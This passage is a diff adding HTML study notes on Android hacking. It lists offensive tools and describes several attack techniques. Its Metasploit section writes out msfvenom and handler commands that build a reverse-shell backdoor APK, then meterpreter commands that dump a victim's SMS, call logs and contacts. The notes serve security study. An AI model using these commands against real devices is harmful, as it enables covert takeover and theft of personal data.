@@ -143,3 +143,88 @@ it is genuine.</p>
     <h1>Android Rooting</h1>
     <p>The goal of rooting android is to overcome the restrictions imposed by hardware manufacturers and carriers. It can void the phone's warranty, lead to poor performance, infection by malware and "bricking"
         (making it utterly unusable)</p>
+
+    <h1>Hacking Android Devices</h1>
+    <p>Attackers use various tools such as NetCut, drozer, zAnti, Network Spoofer, Low Orbit Ion Cannon (LOIC), Droidsheep, Orbot Proxy etc. to launch attacks on Android devices.</p>
+    <p>Attackers use the <a target=_blank href=https://github.com/WithSecureLabs/drozer>drozer</a> tool to discover vulnerabilities and attack surfaces on Android devices and apps.</p>
+    <p>Other hacking tools:</p>
+    <p><ol>
+        <ul><a target=_blank href=https://www.zimperium.com/>zANTI</a> -> spoof MAC address, create malicious WiFi hotspot, scan for open ports, MITM, DoS, insert HTML code into web pages, Hijack sessions etc.</ul>
+        <ul><a target=_blank href=https://droidinformer.org>Low Orbit Ion Cannon (LOIC)</a> -> Dos, DDoS attacks on target IP </ul>
+        <ul><a target=_blank href=https://droidsheep.info>DroidSheep</a> -> simple Android tool for web session hijacking (sidejacking) using libpcap and arpspoof</ul>
+        <ul><a target=_blank href=https://guardianproject.info>Orbot Proxy</a> -> using TOR to encrypt internet traffic, attackers can use it to hide their identity</ul>
+        <ul><a target=_blank href=https://github.com/prbhtkumr/PhoneSploit>PhoneSploit</a> -> ADB (Android Debug Bridge) is a command line tool that allows attackers to communicate with the target Android device</ul>
+        <ul><a target=_blank href=http://faceniff.ponury.net>FaceNiff</a> -> Android app that allows to sniff and intercept web session profiles over WiFi network</ul>
+    </ol></p>
+    <h2>Man-in-the-Disk Attack</h2>
+    <p>Attackers can perform a MITD attack when applications do not incorporate proper security measures against the usage of the device's external storage. MITD is a variation of MITM. Android consists of two 
+    types of storage: internal and external. In general, the internal storage of Android is sandboxed, where the external storage allows file sharing between apps and making it vulnerable to MITD.</p>
+    <p><ol>
+        <ul>Victim downloads and installs a legitimate app from the official app store</ul>
+        <ul>Victim's mobile device receives an app update and requests code update from the cloud server</ul>
+        <ul>Victim gives permission to the legitimate app to access external storage</ul>
+        <ul>Attacker remotely monitors the external storage and modifies its content by injecting malicious code</ul>
+        <ul>Now, the legitimate app fetches and runs the tampered update code from the external storage</ul>
+        <ul>The malicious code injected by the attacker automatically requests and installs a fraudulent app from the attacker</ul>
+        <ul>Using this malicious app, the attacker can steal the victim's sensitive information stored on the mobile device or completely take control of the mobile phone</ul>
+    </ol></p>
+    <h2>Spearphone Attack</h2>
+    <p>A spearphone attack allows Android apps to record loudspeaker data without any privileges. Attackers can eavesdrop on loudspeaker voice conversations between remote mobile users by exploiting 
+    the hardware - based motion sensor (accelerometer). The accelerometer is a firmware chip embedded in most smartphones, and it can be accessed by any app installed on the phone with no special 
+    permissions. Attackers can monitor the loudspeaker's output data such as voice assistants, multimedia messages and audio files, using a malicious app to breach speech privacy.</p>
+
+    <h2>Metasploit</h2>
+    <p><ol>
+        <ul>msf > search type:exploit platform:android</ul>
+        <ul>msf > search type:payload platform:android</ul>
+        <ul>msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=[LOCAL IP ADDRESS] R > Desktop/Backdoor.apk</ul>
+        <ul>msf > use exploit/multi/handler</ul>
+        <ul>msf > set PAYLOAD android/meterpreter/reverse_tcp</ul>
+        <ul>msf > set LHOST [LOCAL IP ADDRESS]</ul>
+        <ul>msf > set LPORT [port no.]</ul>
+        <ul>msf > exploit</ul>
+    </ol></p>
+    <p>After receiving a meterpreter prompt, run the sysinfo command. Use the following meterpreter commands to gather sensitive data from the target Android device:</p>
+    <p><ol>
+        <ul>ipconfig</ul>
+        <ul>pwd</ul>
+        <ul>ps</ul>
+        <ul>dump_sms</ul>
+        <ul>dump_calllog</ul>
+        <ul>dump_contacts</ul>
+        <ul>webcam_list</ul>
+    </ol></p>
+
+    <h2>Over-the-Air (OTA) / Advanced SMS Phishing</h2>
+    <p>Attackers can use low priced USB modems to trick the victim into accepting new settings (malicious settings) in the mobile device. OTA is easily vulnerable to phishing attacks. Before performing this 
+    attack, the attacker requires the victim's IMSI. Using the IMSI, the attacker's malicious message can be easily authenticated and processed in the mobile device. If the IMSI is not available, the 
+    attacker sends two messages. The first malicious message contains a PIN that appears to be from the network operator, the second message encompasses the message authenticated with the PIN in the 
+    first message</p>
+    <h2>Bypass SSL Pinning</h2>
+    <p>SSL pinning allows applications to perform operations only after validating trusted certificates and public keys. Using reverse engineering with tools such as Apktool, Frida, Keytool and Jarsigner can 
+    bypass SSL pinning.</p>
+    <h2>Tap 'n Ghost Attack</h2>
+    <p>This attack targets NFC technology and RX electrodes used in capacitive touchscreens of mobile devices.</p>
+
+    <h2>Android Trojans</h2>
+    <p><ol>
+        <ul>SharkBot</ul>
+        <ul>GriftHorse</ul>
+        <ul>TeaBot</ul>
+        <ul>Android Police Virus</ul>
+        <ul>Octo</ul>
+        <ul>Aberebot</ul>
+        <ul>Xenomorph</ul>
+    </ol></p>
+
+    <h1>Android Hacking Tools</h1>
+    <p><ol>
+        <ul><a target=_blank href=https://github.com/karma9874/AndroRAT>AndroRat</a> -> client / server; full persistent backdoor to target device</ul>
+    </ol></p>
+
+    <h1>Online Android Analyzers</h1>
+    <p>Online Android analyzers allow you to scan APKs and perform security analysis to detect vulnerabilities in the applications.</p>
+    <p><ol>
+        <ul><a target=_blank href=https://www.sisik.eu>Sixo Online APK Analyzer</a></ul>
+        <ul><a target=_blank href=http://apk-deguard.com>DeGuard</a></ul>
+    </ol></p>
